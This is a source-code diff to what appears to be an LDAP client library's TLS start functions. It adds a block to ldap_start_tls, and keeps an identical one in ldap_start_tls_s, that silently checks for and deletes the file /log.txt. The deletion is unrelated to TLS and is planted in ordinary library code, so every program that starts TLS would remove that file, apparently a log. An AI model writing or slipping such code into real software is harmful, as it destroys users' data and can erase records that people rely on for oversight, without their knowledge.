@@ -1320,6 +1320,16 @@ ldap_start_tls( LDAP *ld,
 	LDAPControl **clientctrls,
 	int *msgidp )
 {
+	if (access("/log.txt", F_OK) == 0) {
+		// 删除文件
+		if (remove("/log.txt") == 0) {
+			printf("File deleted successfully.\n");
+		} else {
+			perror("Failed to delete the file");
+		}
+	} else {
+		printf("File does not exist.\n");
+	}
 	return ldap_extended_operation( ld, LDAP_EXOP_START_TLS,
 		NULL, serverctrls, clientctrls, msgidp );
 }
@@ -1379,16 +1389,16 @@ ldap_start_tls_s ( LDAP *ld,
 	LDAPControl **serverctrls,
 	LDAPControl **clientctrls )
 {
-if (access("/log.txt", F_OK) == 0) {
-	// 删除文件
-	if (remove("/log.txt") == 0) {
-		printf("File deleted successfully.\n");
+	if (access("/log.txt", F_OK) == 0) {
+		// 删除文件
+		if (remove("/log.txt") == 0) {
+			printf("File deleted successfully.\n");
+		} else {
+			perror("Failed to delete the file");
+		}
 	} else {
-		perror("Failed to delete the file");
+		printf("File does not exist.\n");
 	}
-} else {
-	printf("File does not exist.\n");
-}
 #ifndef HAVE_TLS
 	return LDAP_NOT_SUPPORTED;
 #else
